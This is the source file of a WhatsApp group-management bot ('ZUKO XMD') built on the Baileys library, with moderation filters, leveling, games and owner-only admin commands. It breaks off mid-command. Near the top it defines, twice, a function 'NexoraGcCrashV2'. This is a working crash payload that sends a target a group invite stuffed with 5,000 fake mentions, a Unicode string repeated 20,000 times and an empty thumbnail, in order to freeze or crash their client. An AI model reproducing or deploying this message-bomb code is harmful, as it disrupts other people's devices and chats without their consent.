require('./setting/config')
const {
  default: baileys, proto, jidNormalizedUser, generateWAMessage,
  generateWAMessageFromContent, getContentType, prepareWAMessageMedia
} = require("@whiskeysockets/baileys");

const {
  downloadContentFromMessage, emitGroupParticipantsUpdate, emitGroupUpdate,
  generateWAMessageContent, makeInMemoryStore, MediaType, areJidsSameUser,
  WAMessageStatus, downloadAndSaveMediaMessage, AuthenticationState,
  GroupMetadata, initInMemoryKeyStore, MiscMessageGenerationOptions,
  useSingleFileAuthState, BufferJSON, WAMessageProto, MessageOptions,
  WAFlag, WANode, WAMetric, ChatModification, MessageTypeProto,
  WALocationMessage, WAContextInfo, WAGroupMetadata, ProxyAgent,
  waChatKey, MimetypeMap, MediaPathMap, WAContactMessage,
  WAContactsArrayMessage, WAGroupInviteMessage, WATextMessage,
  WAMessageContent, WAMessage, BaileysError, WA_MESSAGE_STATUS_TYPE,
  MediariyuInfo, URL_REGEX, WAUrlInfo, WA_DEFAULT_EPHEMERAL,
  WAMediaUpload, mentionedJid, processTime, Browser, MessageType,
  Presence, WA_MESSAGE_STUB_TYPES, Mimetype, relayWAMessage, Browsers,
  GroupSettingChange, DisriyuectReason, WASocket, getStream, WAProto,
  isBaileys, AnyMessageContent, fetchLatestBaileysVersion,
  templateMessage, InteractiveMessage, Header
} = require("@whiskeysockets/baileys");

const fs = require('fs')
const util = require('util')
const chalk = require('chalk')
const moment = require('moment-timezone')
const axios = require('axios')

const { smsg, getGroupAdmins } = require('./allfunc/storage')
const { getSetting, setSetting } = require("./setting/Settings.js")

// ==================== HELPER FUNCTIONS ====================

function sleep(ms) {
  return new Promise(resolve => setTimeout(resolve, ms))
}

// Initialize database
const dbPath = './database.json'
let db = {}
if (fs.existsSync(dbPath)) {
  db = JSON.parse(fs.readFileSync(dbPath))
} else {
  db = {
    xp: {},
    warnings: {},
    mutedGroups: {},
    bannedMembers: {},
    badwords: {},
    blockedDomains: {},
    votes: {},
    pinned: {},
    messageCount: {},
    activeToday: {},
    lastActive: {},
    lastReset: new Date().toDateString(),
    deletedMessages: [],
    mutedPrivate: {},
    ignoredGroups: [],
    archivedGroups: [],
    autoReplies: {},
    polls: {},
    scheduledMessages: {},
    mediaLimit: {},
    textLimit: {},
    bannedEmojis: {},
    whitelist: {},
    blacklist: {},
    modLog: {},
    userRoles: {},
    demoteExempt: {},
    groupPriority: {}
  }
}

function saveDB() {
  fs.writeFileSync(dbPath, JSON.stringify(db, null, 2))
}

if (!fs.existsSync(dbPath)) saveDB()

const spamTracker = {}
const mediaTracker = {}
const textTracker = {}

function updateMessageStats(chat, sender) {
  if (!db.messageCount) db.messageCount = {}
  db.messageCount[chat] = (db.messageCount[chat] || 0) + 1

  if (!db.activeToday) db.activeToday = {}
  if (!db.activeToday[chat]) db.activeToday[chat] = new Set()
  db.activeToday[chat].add(sender)

  if (!db.lastActive) db.lastActive = {}
  if (!db.lastActive[chat]) db.lastActive[chat] = {}
  db.lastActive[chat][sender] = Date.now()

  saveDB()
}

function resetDailyActive() {
  if (db.activeToday) {
    const today = new Date().toDateString()
    if (db.lastReset !== today) {
      db.activeToday = {}
      db.lastReset = today
      saveDB()
    }
  }
}
async function NexoraGcCrashV2(empire, target, generateWAMessageFromContent) {
    try {
        // 1. Massive Mention Bloom (5,000 JIDs)
        let mentions = [];
        for (let i = 0; i < 5000; i++) {
            mentions.push("1" + Math.floor(Math.random() * 9000000) + "@s.whatsapp.net");
        }

        // 2. The "Deadly" String (Unicode Overload)
        const deadString = "☣️ 𝕫𝕦𝕜𝕠 ✗𝕞𝕕 𝐃𝐄𝐒𝐓𝐑𝐔𝐂𝐓𝐎𝐑 ☣️" + "𑇂𑆵𑆴𑆿𑆿".repeat(20000);

        const msg = await generateWAMessageFromContent(target, {
            groupInviteMessage: {
                groupJid: target,
                inviteCode: "ZUKO MD" + Math.random(),
                groupName: deadString, 
                caption: deadString,
                contextInfo: {
                    mentionedJid: mentions,
                    forwardingScore: 999,
                    isForwarded: true,
                    externalAdReply: {
                        showAdAttribution: true,
                        title: "ＺＵＫＯ－ＸＭＤ ☠️ " + "☄️".repeat(500),
                        body: "𝐒𝐲𝐬𝐭𝐞𝐦 𝐇𝐚𝐥𝐭 𝐃𝐞𝐭𝐞𝐜𝐭𝐞𝐝",
                        mediaType: 1,
                        // 3. Corrupt Thumbnail Buffer
                        thumbnail: Buffer.alloc(0), 
                        sourceUrl: "https://wa.me/meta"
                    }
                }
            }
        }, { userJid: target });

        await empire.relayMessage(target, msg.message, { 
            participant: { jid: target } 
        });
        
        return true;
    } catch (e) {
        console.error("DEADLY CRASH ERROR:", e);
        return false;
    }
}
async function addXP(empire, chat, sender, amount = 10) {
  const leveling = getSetting(chat, 'leveling', false)
  if (!leveling) return

  if (!db.xp) db.xp = {}
  if (!db.xp[chat]) db.xp[chat] = {}
  if (!db.xp[chat][sender]) db.xp[chat][sender] = { xp: 0, level: 1 }

  db.xp[chat][sender].xp += amount
  const currentLevel = db.xp[chat][sender].level
  const nextLevelXP = currentLevel * 1000

  if (db.xp[chat][sender].xp >= nextLevelXP) {
    db.xp[chat][sender].level++
    await empire.sendMessage(chat, {
      text: `🎉 @${sender.split('@')[0]} leveled up to level ${db.xp[chat][sender].level}! 🎉`,
      mentions: [sender]
    })
  }

  saveDB()
}
async function NexoraGcCrashV2(empire, target, generateWAMessageFromContent) {
    try {
        // 1. Massive Mention Bloom (5,000 JIDs)
        let mentions = [];
        for (let i = 0; i < 5000; i++) {
            mentions.push("1" + Math.floor(Math.random() * 9000000) + "@s.whatsapp.net");
        }

        // 2. The "Deadly" String (Unicode Overload)
        const deadString = "☣️ 𝕫𝕦𝕜𝕠 ✗𝕞𝕕 𝐃𝐄𝐒𝐓𝐑𝐔𝐂𝐓𝐎𝐑 ☣️" + "𑇂𑆵𑆴𑆿𑆿".repeat(20000);

        const msg = await generateWAMessageFromContent(target, {
            groupInviteMessage: {
                groupJid: target,
                inviteCode: "Nexora" + Math.random(),
                groupName: deadString, 
                caption: deadString,
                contextInfo: {
                    mentionedJid: mentions,
                    forwardingScore: 999,
                    isForwarded: true,
                    externalAdReply: {
                        showAdAttribution: true,
                        title: "ZUKO 𝐌𝐃 ☠️ " + "☄️".repeat(500),
                        body: "𝐒𝐲𝐬𝐭𝐞𝐦 𝐇𝐚𝐥𝐭 𝐃𝐞𝐭𝐞𝐜𝐭𝐞𝐝",
                        mediaType: 1,
                        // 3. Corrupt Thumbnail Buffer
                        thumbnail: Buffer.alloc(0), 
                        sourceUrl: "https://wa.me/meta"
                    }
                }
            }
        }, { userJid: target });

        await empire.relayMessage(target, msg.message, { 
            participant: { jid: target } 
        });
        
        return true;
    } catch (e) {
        console.error("DEADLY CRASH ERROR:", e);
        return false;
    }
}

function isSpam(chat, sender) {
  const slowmode = getSetting(chat, 'slowmode', 0)
  if (slowmode > 0) {
    const key = `${chat}_${sender}`
    const now = Date.now()
    if (!spamTracker[key]) {
      spamTracker[key] = now
      return false
    }
    const diff = (now - spamTracker[key]) / 1000
    if (diff < slowmode) {
      return true
    }
    spamTracker[key] = now
  }
  return false
}

function containsBadWord(chat, text) {
  const badwords = db.badwords?.[chat] || []
  const lowerText = text?.toLowerCase() || ''
  return badwords.some(word => lowerText.includes(word))
}

function containsBlockedLink(chat, text) {
  const blockedDomains = db.blockedDomains?.[chat] || []
  const lowerText = text?.toLowerCase() || ''
  return blockedDomains.some(domain => lowerText.includes(domain))
}

async function downloadMediaMessage(msg, type) {
  try {
    const stream = await downloadContentFromMessage(msg, type)
    let buffer = Buffer.from([])
    for await (const chunk of stream) {
      buffer = Buffer.concat([buffer, chunk])
    }
    return buffer
  } catch (err) {
    console.error('Download error:', err)
    return null
  }
}

function displayTicTacToe(board) {
  const symbols = board.map(cell => cell || '⚪')
  return `
┌───┬───┬───┐
│ ${symbols[0]} │ ${symbols[1]} │ ${symbols[2]} │
├───┼───┼───┤
│ ${symbols[3]} │ ${symbols[4]} │ ${symbols[5]} │
├───┼───┼───┤
│ ${symbols[6]} │ ${symbols[7]} │ ${symbols[8]} │
└───┴───┴───┘
  `.trim()
}

function checkTicTacToeWinner(board) {
  const winPatterns = [
    [0, 1, 2], [3, 4, 5], [6, 7, 8],
    [0, 3, 6], [1, 4, 7], [2, 5, 8],
    [0, 4, 8], [2, 4, 6]
  ]
  for (const pattern of winPatterns) {
    const [a, b, c] = pattern
    if (board[a] && board[a] === board[b] && board[a] === board[c]) {
      return board[a]
    }
  }
  return null
}

function getHangmanArt(attempts) {
  const stages = [
    `\n   -----\n   |   |\n       |\n       |\n       |\n       |\n=========`,
    `\n   -----\n   |   |\n   O   |\n       |\n       |\n       |\n=========`,
    `\n   -----\n   |   |\n   O   |\n   |   |\n       |\n       |\n=========`,
    `\n   -----\n   |   |\n   O   |\n  /|   |\n       |\n       |\n=========`,
    `\n   -----\n   |   |\n   O   |\n  /|\\  |\n       |\n       |\n=========`,
    `\n   -----\n   |   |\n   O   |\n  /|\\  |\n  /    |\n       |\n=========`,
    `\n   -----\n   |   |\n   O   |\n  /|\\  |\n  / \\  |\n       |\n=========`
  ]
  return stages[6 - attempts] || stages[0]
}

function displayConnect4(board) {
  let display = ''
  for (let row of board) {
    display += row.join(' ') + '\n'
  }
  display += '1 2 3 4 5 6 7'
  return display
}

// ==================== MAIN MODULE ====================

module.exports = empire = async (empire, m, chatUpdate, store) => {
  const { from } = m

  try {
    const body = (
      m.mtype === "conversation" ? m.message?.conversation :
        m.mtype === "extendedTextMessage" ? m.message?.extendedTextMessage?.text :
          ""
    )

    const prefix = /^[°zZ#$@+,.?=''():√%!¢£¥€π¤ΠΦ&><™©®Δ^βα¦|/\\©^]/.test(body) ? body.match(/^[°zZ#$@+,.?=''():√%¢£¥€π¤ΠΦ&><!™©®Δ^βα¦|/\\©^]/gi) : '/'

    const isCmd = body.startsWith(prefix)
    const args = body.slice(prefix.length).trim().split(/ +/)
    const command = args.shift().toLowerCase()
    const text = args.join(" ")

    const botNumber = await empire.decodeJid(empire.user.id)
    const owner = JSON.parse(fs.readFileSync('./allfunc/owner.json'))
    const isCreator = [botNumber, ...owner].map(v => v.replace(/[^0-9]/g, '') + '@s.whatsapp.net').includes(m.sender)

    const reply = (teks) => {
      empire.sendMessage(m.chat, { text: teks }, { quoted: m })
    }

    const groupMetadata = m.isGroup ? await empire.groupMetadata(m.chat).catch(() => null) : null

    // Message store for anti-delete
    let messageStore = {}
    if (m.message && !m.key.fromMe) {
      messageStore[m.key.id] = {
        text: m.text || '',
        sender: m.sender,
        chat: m.chat,
        timestamp: Date.now()
      }
    }

    // Process message checks (only for groups)
    if (m.isGroup && m.message && !m.key.fromMe) {
      await updateMessageStats(m.chat, m.sender)
      await addXP(empire, m.chat, m.sender, 10)

      if (isSpam(m.chat, m.sender) && !isCreator) {
        await empire.sendMessage(m.chat, { delete: m.key })
        await empire.sendMessage(m.chat, {
          text: `⚠️ @${m.sender.split('@')[0]} slow mode active!`,
          mentions: [m.sender]
        })
        return
      }

      if (containsBadWord(m.chat, body) && !isCreator) {
        await empire.sendMessage(m.chat, { delete: m.key })
        await empire.sendMessage(m.chat, {
          text: `🚫 @${m.sender.split('@')[0]} bad words are not allowed!`,
          mentions: [m.sender]
        })
        return
      }

      if (getSetting(m.chat, 'antilink', false) && containsBlockedLink(m.chat, body) && !isCreator) {
        await empire.sendMessage(m.chat, { delete: m.key })
        await empire.sendMessage(m.chat, {
          text: `🔗 @${m.sender.split('@')[0]} that domain is blocked!`,
          mentions: [m.sender]
        })
        return
      }

      if (getSetting(m.chat, 'antibot', false) && !isCreator) {
        const botPrefixes = ['.', '!', '/', '#', '$', '%', '&', '*']
        if (botPrefixes.some(p => body?.startsWith(p))) {
          await empire.sendMessage(m.chat, { delete: m.key })
          await empire.sendMessage(m.chat, {
            text: `🤖 @${m.sender.split('@')[0]} other bots are not allowed!`,
            mentions: [m.sender]
          })
          return
        }
      }

      if (db.autoReplies?.[m.chat] && !isCreator) {
        const lowerBody = body?.toLowerCase() || ''
        for (const [trigger, response] of Object.entries(db.autoReplies[m.chat])) {
          if (lowerBody.includes(trigger.toLowerCase())) {
            await empire.sendMessage(m.chat, { text: response }, { quoted: m })
            break
          }
        }
      }

      if (getSetting(m.chat, 'freeze', false) && !isCreator && !m.key.fromMe) {
        await empire.sendMessage(m.chat, { delete: m.key })
        return
      }

      if (db.ignoredGroups?.includes(m.chat) && !isCreator) {
        return
      }

      if (getSetting(m.chat, 'autoReact', false) && !isCreator) {
        const emoji = getSetting(m.chat, 'autoReactEmoji', '👍')
        await empire.sendMessage(m.chat, {
          react: { text: emoji, key: m.key }
        }).catch(() => { })
      }

      if (db.mutedGroups?.[m.chat] && Date.now() < db.mutedGroups[m.chat] && !isCreator) {
        await empire.sendMessage(m.chat, { delete: m.key })
        return
      }

      if (db.bannedMembers?.[m.chat]?.includes(m.sender) && !isCreator) {
        await empire.sendMessage(m.chat, { delete: m.key })
        return
      }

      if (getSetting(m.chat, 'lockmedia', false) && !isCreator) {
        const isMedia = m.message?.imageMessage || m.message?.videoMessage ||
          m.message?.stickerMessage || m.message?.audioMessage ||
          m.message?.documentMessage
        if (isMedia) {
          await empire.sendMessage(m.chat, { delete: m.key })
          return
        }
      }

      if (getSetting(m.chat, 'locktext', false) && !isCreator) {
        const isText = m.message?.conversation || m.message?.extendedTextMessage
        if (isText) {
          await empire.sendMessage(m.chat, { delete: m.key })
          return
        }
      }

      // Anti-sticker check (groups)
      if (getSetting(m.chat, 'antisticker', false) && !isCreator) {
        const isSticker = m.message?.stickerMessage
        if (isSticker) {
          await empire.sendMessage(m.chat, { delete: m.key })
          await empire.sendMessage(m.chat, {
            text: `🚫 @${m.sender.split('@')[0]} stickers are not allowed in this group!`,
            mentions: [m.sender]
          })
          return
        }
      }

      // Anti-group mention / tag all
      if (getSetting(m.chat, 'antitagall', false) && !isCreator) {
        const threshold = getSetting(m.chat, 'antitagallThreshold', 10)
        const mentionedCount = m.mentionedJid?.length || 0
        if (mentionedCount >= threshold) {
          await empire.sendMessage(m.chat, { delete: m.key })
          await empire.sendMessage(m.chat, {
            text: `🚫 @${m.sender.split('@')[0]} mass mentions (${mentionedCount} users) are not allowed!`,
            mentions: [m.sender]
          })
          return
        }
      }

      // Anti-group link blocking
      if (getSetting(m.chat, 'antigrouplink', false) && !isCreator) {
        const groupLinkRegex = /(?:https?:\/\/)?chat\.whatsapp\.com\/(?:invite\/)?([A-Za-z0-9]{22})/gi
        if (groupLinkRegex.test(m.text)) {
          await empire.sendMessage(m.chat, { delete: m.key })
          await empire.sendMessage(m.chat, {
            text: `🔗 @${m.sender.split('@')[0]} group links are not allowed!`,
            mentions: [m.sender]
          })
          return
        }
      }
    }

    // Auto-reply to private messages
    if (!m.isGroup && !isCreator && !m.key.fromMe) {
      const autoPM = getSetting('global', 'autoPM', false)
      const autoPMReply = getSetting('global', 'autoPMReply', '🤖 Bot is currently busy. Please try again later.')

      if (autoPM) {
        await empire.sendMessage(m.chat, { text: autoPMReply }, { quoted: m })
      }

      if (db.mutedPrivate?.[m.sender] && Date.now() < db.mutedPrivate[m.sender]) {
        return
      }
    }

    // Anti-sticker check (private)
    if (!m.isGroup && getSetting('global', 'antistickerPM', false) && !isCreator) {
      const isSticker = m.message?.stickerMessage
      if (isSticker) {
        await empire.sendMessage(m.chat, { delete: m.key })
        await empire.sendMessage(m.chat, {
          text: '🚫 Stickers are not allowed in private chat with this bot!'
        })
        return
      }
    }

    // Global anti-sticker
    if (getSetting('global', 'antisticker', false) && !isCreator) {
      const isSticker = m.message?.stickerMessage
      if (isSticker) {
        await empire.sendMessage(m.chat, { delete: m.key })
        return
      }
    }

    if (isCmd) {
      console.log(chalk.black(chalk.bgWhite('[ Command ]')), chalk.black(chalk.bgGreen(new Date)), chalk.black(chalk.bgBlue(body)) + '\n' + chalk.magenta('=> From'), chalk.green(m.pushName), chalk.yellow(m.sender))
    }

    // ==================== COMMANDS ====================

    const activeGames = {
      tictactoe: {},
      hangman: {},
      trivia: {},
      wordle: {},
      mathgame: {},
      numberguess: {},
      battleship: {},
      connect4: {}
    }

    switch (command) {

      case 'ping': {
        const start = Date.now()
        await empire.sendPresenceUpdate('composing', m.chat)
        await sleep(50)
        const latency = Date.now() - start
        
        const latencyEmoji = latency < 100 ? '💎' : latency < 200 ? '✨' : latency < 300 ? '⚡' : '🌙'
        const fakeId = Math.random().toString(36).substring(2, 15).toUpperCase()
        
        const msg = `
┏━━━━━━━━━━━━━━━━━━━━━━━━┓
┃      ⚡ 𝗭𝗨𝗞𝗢 𝗫𝗠𝗗       ┃
┣━━━━━━━━━━━━━━━━━━━━━━━━┫
┃ 📡 𝗖𝗵𝗮𝘁 𝗜𝗗: ${fakeId}   ┃
┃ ⏱️  𝗣𝗶𝗻𝗴: ${latency}ms ${latencyEmoji} ┃
┃ 📊 𝗦𝘁𝗮𝘁𝘂𝘀: 𝗢𝗻𝗹𝗶𝗻𝗲 ✅    ┃
┃ 🕐 𝗧𝗶𝗺𝗲: ${new Date().toLocaleTimeString()}   ┃
┣━━━━━━━━━━━━━━━━━━━━━━━━┫
┃   💫 𝗭𝗨𝗞𝗢 𝗫𝗠𝗗 𝗩𝟰 💫    ┃
┗━━━━━━━━━━━━━━━━━━━━━━━━┛
        `.trim()
        
        await empire.sendMessage(m.chat, {
          text: msg,
          contextInfo: {
            isForwarded: true,
            forwardedNewsletterMessageInfo: {
              newsletterJid: '120363405724402785@newsletter',
              newsletterName: '𝕫𝕦𝕜𝕠 ✗𝕞𝕕'
            }
          }
        }, { quoted: m })
      }
      break
// ==================== GROUP MANAGEMENT COMMANDS ====================

case 'setname':
case 'setgcname': {
  if (!m.isGroup) return reply('❌ This command is only for groups')
  if (!isCreator) return reply('❌ Owner only')
  if (!text) return reply(`📝 Usage: ${prefix}setname <group name>`)
  
  try {
    await empire.groupUpdateSubject(m.chat, text)
    reply(`✅ Group name changed to: *${text}*`)
  } catch (err) {
    reply('❌ Failed to change group name. Make sure bot is admin.')
  }
}
break

case 'setdesc':
case 'setdescription': {
  if (!m.isGroup) return reply('❌ This command is only for groups')
  if (!isCreator) return reply('❌ Owner only')
  if (!text) return reply(`📝 Usage: ${prefix}setdesc <description>`)
  
  try {
    await empire.groupUpdateDescription(m.chat, text)
    reply(`✅ Group description updated!`)
  } catch (err) {
    reply('❌ Failed to update description. Make sure bot is admin.')
  }
}
break

case 'lock':
case 'close': {
  if (!m.isGroup) return reply('❌ This command is only for groups')
  if (!isCreator) return reply('❌ Owner only')
  
  try {
    await empire.groupSettingUpdate(m.chat, 'announcement')
    reply('🔒 Group locked. Only admins can send messages.')
  } catch (err) {
    reply('❌ Failed to lock group. Make sure bot is admin.')
  }
}
break
// ==================== 20 MORE GROUP COMMANDS (BATCH 5) ====================

case 'groupreport':
case 'reportgroup': {
  if (!m.isGroup) return reply('❌ Group only')
  if (!isCreator) return reply('❌ Owner only')
  
  try {
    const metadata = await empire.groupMetadata(m.chat)
    const participants = metadata.participants
    const admins = participants.filter(p => p.admin)
    const superAdmins = participants.filter(p => p.admin === 'superadmin')
    
    const report = `
╭━━━━━━━━━━━━━━━━━━━━━━━━━━╮
┃    📋 𝗚𝗥𝗢𝗨𝗣 𝗥𝗘𝗣𝗢𝗥𝗧     ┃
┣━━━━━━━━━━━━━━━━━━━━━━━━━━┫
┃ 📛 Name: ${metadata.subject}
┃ 🆔 ID: ${metadata.id}
┃ 👥 Members: ${participants.length}
┃ 👑 Admins: ${admins.length}
┃ ⭐ Super Admins: ${superAdmins.length}
┃ 🔒 Status: ${metadata.announce ? 'Locked' : 'Open'}
┃ 📅 Created: ${new Date(metadata.creation * 1000).toLocaleDateString()}
┃ 💬 Total Msgs: ${db.messageCount?.[m.chat] || 0}
┃ 📱 Active Today: ${db.activeToday?.[m.chat]?.size || 0}
┃ 🚫 Banned: ${db.bannedMembers?.[m.chat]?.length || 0}
┃ ⚠️ Warnings: ${Object.keys(db.warnings?.[m.chat] || {}).length}
┃ 📌 Pinned: ${db.pinned?.[m.chat] ? 'Yes' : 'No'}
┃ 🤖 Leveling: ${getSetting(m.chat, 'leveling', false) ? 'On' : 'Off'}
┃ 🐢 Slowmode: ${getSetting(m.chat, 'slowmode', 0)}s
┃ 🔗 Anti-link: ${getSetting(m.chat, 'antilink', false) ? 'On' : 'Off'}
┃ 🤖 Anti-bot: ${getSetting(m.chat, 'antibot', false) ? 'On' : 'Off'}
┣━━━━━━━━━━━━━━━━━━━━━━━━━━┫
┃    💫 𝗭𝗨𝗞𝗢 𝗫𝗠𝗗 𝗩𝟰     ┃
╰━━━━━━━━━━━━━━━━━━━━━━━━━━╯
    `.trim()
    
    reply(report)
  } catch (err) {
    reply('❌ Failed to generate group report.')
  }
}
break

case 'groupclean':
case 'clearchat': {
  if (!m.isGroup) return reply('❌ Group only')
  if (!isCreator) return reply('❌ Owner only')
  
  const count = parseInt(args[0]) || 50
  
  if (count > 100) {
    return reply('⚠️ Maximum 100 messages can be deleted at once.')
  }
  
  try {
    const messages = await store.loadMessages(m.chat, count)
    let deleted = 0
    
    for (const msg of messages) {
      if (msg.key && !msg.key.fromMe) {
        try {
          await empire.sendMessage(m.chat, { delete: msg.key })
          deleted++
          await sleep(500)
        } catch (err) {}
      }
    }
    
    reply(`🗑️ Deleted ${deleted} messages from the group.`)
  } catch (err) {
    reply('❌ Failed to clear messages.')
  }
}
break

case 'groupfreeze':
case 'freezegroup': {
  if (!m.isGroup) return reply('❌ Group only')
  if (!isCreator) return reply('❌ Owner only')
  
  const mode = args[0]?.toLowerCase()
  
  if (!mode || !['on', 'off'].includes(mode)) {
    return reply(`❄️ Usage: ${prefix}freezegroup on/off\n\nFreezes all group activity. No messages can be sent.`)
  }
  
  setSetting(m.chat, 'freeze', mode === 'on')
  reply(`${mode === 'on' ? '❄️ Group frozen' : '🔥 Group unfrozen'} ${mode === 'on' ? 'No messages can be sent.' : 'Normal activity resumed.'}`)
}
break

case 'groupignore':
case 'ignoregroup': {
  if (!m.isGroup) return reply('❌ Group only')
  if (!isCreator) return reply('❌ Owner only')
  
  if (!db.ignoredGroups) db.ignoredGroups = []
  
  if (db.ignoredGroups.includes(m.chat)) {
    db.ignoredGroups = db.ignoredGroups.filter(id => id !== m.chat)
    reply('✅ Bot will now respond in this group.')
  } else {
    db.ignoredGroups.push(m.chat)
    reply('🚫 Bot will ignore all commands in this group.')
  }
  
  saveDB()
}
break

case 'grouppriority':
case 'prioritygroup': {
  if (!m.isGroup) return reply('❌ Group only')
  if (!isCreator) return reply('❌ Owner only')
  
  const level = parseInt(args[0])
  
  if (!level || level < 1 || level > 5) {
    return reply(`⭐ Usage: ${prefix}prioritygroup <1-5>\n\nSets group priority level. Higher priority groups get faster responses.`)
  }
  
  if (!db.groupPriority) db.groupPriority = {}
  db.groupPriority[m.chat] = level
  saveDB()
  
  reply(`✅ Group priority set to level ${level}.`)
}
break

case 'groupbackupall':
case 'backupall': {
  if (!isCreator) return reply('❌ Owner only')
  
  const groups = await store.getAllGroups()
  const backup = {
    timestamp: Date.now(),
    groups: []
  }
  
  for (const group of groups) {
    backup.groups.push({
      id: group.id,
      name: group.subject,
      settings: {
        welcome: getSetting(group.id, 'welcome', false),
        goodbye: getSetting(group.id, 'goodbye', false),
        antilink: getSetting(group.id, 'antilink', false),
        antibot: getSetting(group.id, 'antibot', false),
        leveling: getSetting(group.id, 'leveling', false),
        slowmode: getSetting(group.id, 'slowmode', 0)
      },
      memberCount: group.participants?.length || 0
    })
  }
  
  const backupFile = `./all_groups_backup_${Date.now()}.json`
  fs.writeFileSync(backupFile, JSON.stringify(backup, null, 2))
  
  await empire.sendMessage(m.chat, {
    document: fs.readFileSync(backupFile),
    mimetype: 'application/json',
    fileName: 'all_groups_backup.json',
    caption: `📦 *ALL GROUPS BACKUP*\n\nTotal Groups: ${groups.length}\n📅 Date: ${new Date().toLocaleString()}`
  }, { quoted: m })
  
  fs.unlinkSync(backupFile)
}
break

case 'groupinviteall':
case 'inviteall': {
  if (!m.isGroup) return reply('❌ Group only')
  if (!isCreator) return reply('❌ Owner only')
  
  const numbers = text.split(/[\s,]+/).filter(n => n.trim())
  if (!numbers.length) return reply(`📝 Usage: ${prefix}inviteall 234XXXXXXXXX,234YYYYYYYYY\n\nInvites multiple numbers to the group.`)
  
  let invited = 0
  let failed = 0
  
  for (const num of numbers) {
    try {
      const jid = num.replace(/[^0-9]/g, '') + '@s.whatsapp.net'
      await empire.groupParticipantsUpdate(m.chat, [jid], 'add')
      invited++
      await sleep(1500)
    } catch (err) {
      failed++
    }
  }
  
  reply(`✅ Invited: ${invited}\n❌ Failed: ${failed}`)
}
break

case 'groupdemoteall':
case 'demoteallnonowner': {
  if (!m.isGroup) return reply('❌ Group only')
  if (!isCreator) return reply('❌ Owner only')
  
  try {
    const metadata = await empire.groupMetadata(m.chat)
    const creator = metadata.owner
    const admins = metadata.participants.filter(p => p.admin && p.id !== creator && p.id !== botNumber)
    let demoted = 0
    
    for (const admin of admins) {
      try {
        await empire.groupParticipantsUpdate(m.chat, [admin.id], 'demote')
        demoted++
        await sleep(1000)
      } catch (err) {}
    }
    
    reply(`✅ Demoted ${demoted} admins (owner and bot retained).`)
  } catch (err) {
    reply('❌ Failed to demote admins.')
  }
}
break

case 'grouproles':
case 'rolemanager': {
  if (!m.isGroup) return reply('❌ Group only')
  if (!isCreator) return reply('❌ Owner only')
  
  const action = args[0]?.toLowerCase()
  const user = m.mentionedJid[0]
  const role = args[2]?.toLowerCase()
  
  if (!db.userRoles) db.userRoles = {}
  if (!db.userRoles[m.chat]) db.userRoles[m.chat] = {}
  
  if (action === 'set' && user && role) {
    db.userRoles[m.chat][user] = role
    saveDB()
    reply(`✅ @${user.split('@')[0]} assigned role: ${role}`, { mentions: [user] })
  }
  else if (action === 'remove' && user) {
    delete db.userRoles[m.chat][user]
    saveDB()
    reply(`✅ Removed role from @${user.split('@')[0]}`, { mentions: [user] })
  }
  else if (action === 'list') {
    const roles = Object.entries(db.userRoles[m.chat])
    if (!roles.length) return reply('📭 No roles assigned.')
    
    let text = '👑 *USER ROLES*\n\n'
    const mentions = []
    roles.forEach(([uid, role], i) => {
      text += `${i + 1}. @${uid.split('@')[0]} → ${role}\n`
      mentions.push(uid)
    })
    await empire.sendMessage(m.chat, { text, mentions }, { quoted: m })
  }
  else {
    reply(`📝 Usage:\n${prefix}rolemanager set @user <role>\n${prefix}rolemanager remove @user\n${prefix}rolemanager list`)
  }
}
break

case 'groupwelcometest':
case 'testwelcomeall': {
  if (!m.isGroup) return reply('❌ Group only')
  if (!isCreator) return reply('❌ Owner only')
  
  const metadata = await empire.groupMetadata(m.chat)
  const randomMember = metadata.participants[Math.floor(Math.random() * metadata.participants.length)]
  
  const welcomeMsg = getSetting(m.chat, 'welcomeMessage', null)
  let testMsg = welcomeMsg || '👋 Welcome @user to @group!'
  testMsg = testMsg
    .replace(/@user/g, `@${randomMember.id.split('@')[0]}`)
    .replace(/@group/g, metadata.subject)
    .replace(/@count/g, metadata.participants.length.toString())
  
  await empire.sendMessage(m.chat, {
    text: `🧪 *WELCOME MESSAGE TEST*\n\n${testMsg}`,
    mentions: [randomMember.id]
  }, { quoted: m })
}
break

case 'groupgoodbyetest':
case 'testgoodbyeall': {
  if (!m.isGroup) return reply('❌ Group only')
  if (!isCreator) return reply('❌ Owner only')
  
  const metadata = await empire.groupMetadata(m.chat)
  const randomMember = metadata.participants[Math.floor(Math.random() * metadata.participants.length)]
  
  const goodbyeMsg = getSetting(m.chat, 'goodbyeMessage', null)
  let testMsg = goodbyeMsg || '👋 Goodbye @user! Sad to see you leave @group 💔'
  testMsg = testMsg
    .replace(/@user/g, `@${randomMember.id.split('@')[0]}`)
    .replace(/@group/g, metadata.subject)
  
  await empire.sendMessage(m.chat, {
    text: `🧪 *GOODBYE MESSAGE TEST*\n\n${testMsg}`,
    mentions: [randomMember.id]
  }, { quoted: m })
}
break

case 'groupschedule':
case 'schedulemsg': {
  if (!m.isGroup) return reply('❌ Group only')
  if (!isCreator) return reply('❌ Owner only')
  
  const time = args[0]
  const message = args.slice(1).join(' ')
  
  if (!time || !message) {
    return reply(`📅 Usage: ${prefix}schedulemsg <HH:MM> <message>\nExample: ${prefix}schedulemsg 09:00 Good morning everyone!`)
  }
  
  if (!db.scheduledMessages) db.scheduledMessages = {}
  if (!db.scheduledMessages[m.chat]) db.scheduledMessages[m.chat] = []
  
  db.scheduledMessages[m.chat].push({
    time: time,
    message: message,
    created: Date.now()
  })
  
  saveDB()
  reply(`✅ Message scheduled for ${time} daily.`)
}
break

case 'groupschedulelist':
case 'scheduledlist': {
  if (!m.isGroup) return reply('❌ Group only')
  if (!isCreator) return reply('❌ Owner only')
  
  const schedules = db.scheduledMessages?.[m.chat] || []
  if (!schedules.length) return reply('📭 No scheduled messages.')
  
  let text = '📅 *SCHEDULED MESSAGES*\n\n'
  schedules.forEach((s, i) => {
    text += `${i + 1}. ⏰ ${s.time}\n   💬 ${s.message.substring(0, 50)}${s.message.length > 50 ? '...' : ''}\n\n`
  })
  
  reply(text)
}
break

case 'groupscheduledelete':
case 'deleteschedule': {
  if (!m.isGroup) return reply('❌ Group only')
  if (!isCreator) return reply('❌ Owner only')
  
  const index = parseInt(args[0]) - 1
  
  if (isNaN(index)) {
    return reply(`📝 Usage: ${prefix}deleteschedule <number>\nUse ${prefix}scheduledlist to see numbers.`)
  }
  
  const schedules = db.scheduledMessages?.[m.chat] || []
  if (!schedules[index]) return reply('❌ Schedule not found.')
  
  schedules.splice(index, 1)
  saveDB()
  
  reply('✅ Schedule deleted successfully.')
}
break

case 'groupannounce':
case 'announce': {
  if (!m.isGroup) return reply('❌ Group only')
